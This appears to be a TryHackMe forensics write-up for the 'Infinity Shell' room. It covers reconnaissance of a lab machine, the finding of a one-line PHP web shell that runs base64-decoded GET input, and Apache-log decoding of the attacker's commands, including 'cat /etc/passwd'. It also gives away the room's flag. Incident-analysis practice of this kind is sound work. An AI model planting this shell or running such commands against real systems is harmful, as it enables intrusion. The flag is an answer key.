
# hfb1infinityshell

## Task 1 -  Forensics  Infinity Shell

Cipher’s legion of bots has exploited a known vulnerability in our web application, leaving behind a dangerous web shell implant. Investigate the breach and trace the attacker's footsteps!

Note: Click the **Start Machine** button to spawn the Virtual Machine.

## Solve

### Escaneo

```
┌──(root㉿kali)-[/home/kali/tmp/tryhackme/hfb1infinityshell]
└─# nmap -sV -sC -T5 -p- -n -Pn -v 10.10.170.50 --min-rate 5000 -o nmap
Warning: The -o option is deprecated. Please use -oN
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-18 19:14 CDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 19:14
Completed NSE at 19:14, 0.00s elapsed
Initiating NSE at 19:14
Completed NSE at 19:14, 0.00s elapsed
Initiating NSE at 19:14
Completed NSE at 19:14, 0.00s elapsed
Initiating SYN Stealth Scan at 19:14
Scanning 10.10.170.50 [65535 ports]
Discovered open port 80/tcp on 10.10.170.50
Discovered open port 22/tcp on 10.10.170.50
Warning: 10.10.170.50 giving up on port because retransmission cap hit (2).
Discovered open port 5901/tcp on 10.10.170.50
Discovered open port 5901/tcp on 10.10.170.50
Completed SYN Stealth Scan at 19:14, 18.29s elapsed (65535 total ports)
Initiating Service scan at 19:14
Scanning 3 services on 10.10.170.50
Completed Service scan at 19:16, 88.02s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.170.50.
Initiating NSE at 19:16
Completed NSE at 19:16, 6.67s elapsed
Initiating NSE at 19:16
Completed NSE at 19:16, 6.49s elapsed
Initiating NSE at 19:16
Completed NSE at 19:16, 0.00s elapsed
Nmap scan report for 10.10.170.50
Host is up (0.20s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 59:08:73:c9:0a:46:ea:14:49:3a:0a:24:d8:08:72:f4 (ECDSA)
|_  256 96:f1:c7:cb:30:86:ac:b1:95:65:6d:1d:a1:3f:cb:f9 (ED25519)
80/tcp    open     http    WebSockify Python/3.12.3
|_http-server-header: WebSockify Python/3.12.3
|_http-title: Error response
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 405 Method Not Allowed
|     Server: WebSockify Python/3.12.3
|     Date: Sat, 19 Jul 2025 00:14:59 GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 355
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 405</p>
|     <p>Message: Method Not Allowed.</p>
|     <p>Error code explanation: 405 - Specified method is invalid for this resource.</p>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 501 Unsupported method ('OPTIONS')
|     Server: WebSockify Python/3.12.3
|     Date: Sat, 19 Jul 2025 00:14:59 GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 360
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 501</p>
|     <p>Message: Unsupported method ('OPTIONS').</p>
|     <p>Error code explanation: 501 - Server does not support this operation.</p>
|     </body>
|     </html>
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
945/tcp   filtered unknown
5901/tcp  open     vnc     VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     VeNCrypt (19)
|     VNC Authentication (2)
|   VeNCrypt auth subtypes: 
|     Unknown security type (2)
|_    VNC auth, Anonymous TLS (258)
 

```


```http
curl -I http://10.10.170.50/ 
HTTP/1.1 405 Method Not Allowed
Server: WebSockify Python/3.12.3
Date: Sat, 19 Jul 2025 00:16:35 GMT
Connection: close
Content-Type: text/html;charset=utf-8
Content-Length: 355

```

```http
┌──(root㉿kali)-[/home/kali/tmp/tryhackme/hfb1infinityshell]
└─# curl -v http://10.10.170.50/ 
*   Trying 10.10.170.50:80...
* Connected to 10.10.170.50 (10.10.170.50) port 80
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 10.10.170.50
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 405 Method Not Allowed
< Server: WebSockify Python/3.12.3
< Date: Sat, 19 Jul 2025 00:19:43 GMT
< Connection: close
< Content-Type: text/html;charset=utf-8
< Content-Length: 355
< 
<!DOCTYPE HTML>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 405</p>
        <p>Message: Method Not Allowed.</p>
        <p>Error code explanation: 405 - Specified method is invalid for this resource.</p>
    </body>
</html>
* shutting down connection #0

```

#### Verificar si es WebSocket
```
┌──(root㉿kali)-[/home/kali/tmp/tryhackme/hfb1infinityshell]
└─# curl -i -N \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Host: 10.10.170.50" \
  -H "Origin: http://10.10.170.50" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Version: 13" \
  http://10.10.170.50/
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=

�
 RFB 003.008


```


Has establecido correctamente una conexión **WebSocket** y el servidor respondió con:
Esto es **Remote Framebuffer Protocol (RFB)** versión 3.8, que es el protocolo usado por **VNC (Virtual Network Computing)**.

### La cosa fue por aca

#### buscamos que onda en el web

```
buntu@tryhackme:~$ cd /var/www/html/
ubuntu@tryhackme:/var/www/html$ ls -la
total 24
drwxr-xr-x 3 www-data www-data  4096 Mar  6 09:35 .
drwxr-xr-x 3 root     root      4096 Mar  6 09:32 ..
drwxr-xr-x 8 www-data www-data  4096 Mar  6 09:37 CMSsite-master
-rw-r--r-- 1 www-data www-data 10671 Mar  6 09:32 index.html
ubuntu@tryhackme:/var/www/html$ 


```

#### localizamos el sitio web y el webshell plantado

```
ubuntu@tryhackme:/var/www/html$ ls -la
total 24
drwxr-xr-x 3 www-data www-data  4096 Mar  6 09:35 .
drwxr-xr-x 3 root     root      4096 Mar  6 09:32 ..
drwxr-xr-x 8 www-data www-data  4096 Mar  6 09:37 CMSsite-master
-rw-r--r-- 1 www-data www-data 10671 Mar  6 09:32 index.html
ubuntu@tryhackme:/var/www/html$ cd CMSsite-master/
ubuntu@tryhackme:/var/www/html/CMSsite-master$ ls -la
total 80
drwxr-xr-x 8 www-data www-data  4096 Mar  6 09:37 .
drwxr-xr-x 3 www-data www-data  4096 Mar  6 09:35 ..
-rw-r--r-- 1 www-data www-data   106 Mar  6  2022 .gitattributes
-rw-r--r-- 1 www-data www-data  1070 Mar  6  2022 LICENSE
-rw-r--r-- 1 www-data www-data  2146 Mar  6  2022 README.md
drwxr-xr-x 8 www-data www-data  4096 Mar  6  2022 admin
-rw-r--r-- 1 www-data www-data  2701 Mar  6  2022 category.php
drwxr-xr-x 2 www-data www-data  4096 Mar  6  2022 css
drwxr-xr-x 4 www-data www-data  4096 Mar  6  2022 fonts
drwxr-xr-x 2 www-data www-data  4096 Mar  6 09:50 img
drwxr-xr-x 2 www-data www-data  4096 Mar  6 09:38 includes
-rw-r--r-- 1 www-data www-data  2593 Mar  6  2022 index.php
drwxr-xr-x 2 www-data www-data  4096 Mar  6  2022 js
-rw-r--r-- 1 www-data www-data 10071 Mar  6  2022 php_cms.sql
-rw-r--r-- 1 www-data www-data  5411 Mar  6  2022 post.php
-rw-r--r-- 1 www-data www-data  3176 Mar  6  2022 register.php
-rw-r--r-- 1 www-data www-data  2727 Mar  6  2022 search.php
ubuntu@tryhackme:/var/www/html/CMSsite-master$ cd img/
ubuntu@tryhackme:/var/www/html/CMSsite-master/img$ ls -la
total 9000
-rw-r--r-- 1 www-data www-data   88356 Mar  6  2022 '$user_image'
drwxr-xr-x 2 www-data www-data    4096 Mar  6 09:50  .
drwxr-xr-x 8 www-data www-data    4096 Mar  6 09:37  ..
-rw-r--r-- 1 www-data www-data  249196 Mar  6  2022  10067.jpg
-rw-r--r-- 1 www-data www-data 1512559 Mar  6  2022  10958.jpg
-rw-r--r-- 1 www-data www-data  390784 Mar  6  2022  19946.jpg
-rw-r--r-- 1 www-data www-data  192921 Mar  6  2022  22497.jpg
-rw-r--r-- 1 www-data www-data   39148 Mar  6  2022  2347033459561.jpg
-rw-r--r-- 1 www-data www-data  331708 Mar  6  2022  24-cast-tv-serie-wallpapers-1024x768.jpg
-rw-r--r-- 1 www-data www-data  460988 Mar  6  2022  24195.jpg
-rw-r--r-- 1 www-data www-data  834918 Mar  6  2022  25501.jpg
-rw-r--r-- 1 www-data www-data  244682 Mar  6  2022  33070.jpg
-rw-r--r-- 1 www-data www-data  359800 Mar  6  2022  36296.jpg
-rw-r--r-- 1 www-data www-data   63259 Mar  6  2022  500.JPG
-rw-r--r-- 1 www-data www-data  207263 Mar  6  2022  505.jpg
-rw-r--r-- 1 www-data www-data  416245 Mar  6  2022  9400.jpg
-rw-r--r-- 1 www-data www-data   88886 Mar  6  2022 'BlackBerry 9000521.JPG'
-rw-r--r-- 1 www-data www-data   48628 Mar  6  2022 'Chelsea-me 20151215_142015.jpg'
-rw-r--r-- 1 www-data www-data   66576 Mar  6  2022  IMG_20160129_145808.jpg
-rw-r--r-- 1 www-data www-data   82968 Mar  6  2022  IMG_20160214_152546.jpg
-rw-r--r-- 1 www-data www-data   76160 Mar  6  2022  IMG_20160725_144420.jpg
-rw-r--r-- 1 www-data www-data 1545274 Mar  6  2022  IMG_20160917_152307.jpg
-rw-r--r-- 1 www-data www-data  300564 Mar  6  2022  acer-aspire-blue-computer-wallpapers-1024x768.jpg
-rw-r--r-- 1 www-data www-data  185480 Mar  6  2022  call-of-duty-games-wallpapers.jpg
-rw-r--r-- 1 www-data www-data  398649 Mar  6  2022  casino-royale-james-bond-wallpaper.jpg
-rw-r--r-- 1 www-data www-data   82142 Mar  6  2022  cms_admin.JPG
-rw-r--r-- 1 www-data www-data   77145 Mar  6  2022  cms_admin_categories.JPG
-rw-r--r-- 1 www-data www-data  105761 Mar  6  2022  cms_admin_post.JPG
-rw-r--r-- 1 www-data www-data   69230 Mar  6  2022  cms_admin_restrict.JPG
-rw-r--r-- 1 www-data www-data   99407 Mar  6  2022  cms_admin_users1.JPG
-rw-r--r-- 1 www-data www-data   57871 Mar  6  2022  cms_admin_users2.JPG
-rw-r--r-- 1 www-data www-data   96583 Mar  6  2022  cms_front.JPG
-rw-r--r-- 1 www-data www-data   17911 Mar  6  2022  comment.jpg
-rw-r--r-- 1 www-data www-data      48 Mar  6 09:50  images.php
-rw-r--r-- 1 www-data www-data   99589 Mar  6  2022  post_img.jpg
-rw-r--r-- 1 www-data www-data  192843 Mar  6  2022  post_img2.jpg
-rw-r--r-- 1 www-data www-data    3954 Mar  6  2022  vimeo.png
-rw-r--r-- 1 www-data www-data   27243 Mar  6  2022 ''$'\303\242\342\202\254\302\252''+234 803 426 6336'$'\303\242\342\202\254\302\254'' 20151226_180506.jpg'
-rw-r--r-- 1 www-data www-data   18106 Mar  6  2022 ''$'\303\242\342\202\254\302\252''+234 810 956 2045'$'\303\242\342\202\254\302\254'' 20151007_200625.jpg'
ubuntu@tryhackme:/var/www/html/CMSsite-master/img$ cat index.php
cat: index.php: No such file or directory
ubuntu@tryhackme:/var/www/html/CMSsite-master/img$ cat images.php 
<?php system(base64_decode($_GET['query'])); ?>
ubuntu@tryhackme:/var/www/html/CMSsite-master/img$
```

#### Ahora revisamos los logs de apache 

```
buntu@tryhackme:/var/www/html/CMSsite-master/img$ cd /var/log/apache2/
ubuntu@tryhackme:/var/log/apache2$ ls -la
total 56
drwxr-x---  2 root adm     4096 Jul 19 15:16 .
drwxrwxr-x 20 root syslog  4096 Jul 19 15:16 ..
-rw-r-----  1 root adm        0 Mar  6 09:32 access.log
-rw-r-----  1 root adm        0 Jul 19 15:16 error.log
-rw-r-----  1 root adm     4189 Mar  6 15:55 error.log.1
-rw-r-----  1 root adm        0 Jul 19 15:16 other_vhosts_access.log
	
```

```
ubuntu@tryhackme:/var/log/apache2$ grep 'php?query' other_vhosts_access.log.1  | cut -d '?' -f 2 | cut -d ' ' -f 1 | cut -d ' ' -f 1
query=d2hvYW1pCg==
query=bHMK
query=ZWNobyAnVEhNe3N1cDNyXzM0c3lfdzNic2gzbGx9Jwo=
query=aWZjb25maWcK
query=Y2F0IC9ldGMvcGFzc3dkCg==
query=aWQK

```


```
d2hvYW1pCg==
bHMK
ZWNobyAnVEhNe3N1cDNyXzM0c3lfdzNic2gzbGx9Jwo=
aWZjb25maWcK
Y2F0IC9ldGMvcGFzc3dkCg==
aWQK

```

```
whoami
ls
echo 'THM{sup3r_34sy_w3bsh3ll}'
ifconfig
cat /etc/passwd
id

```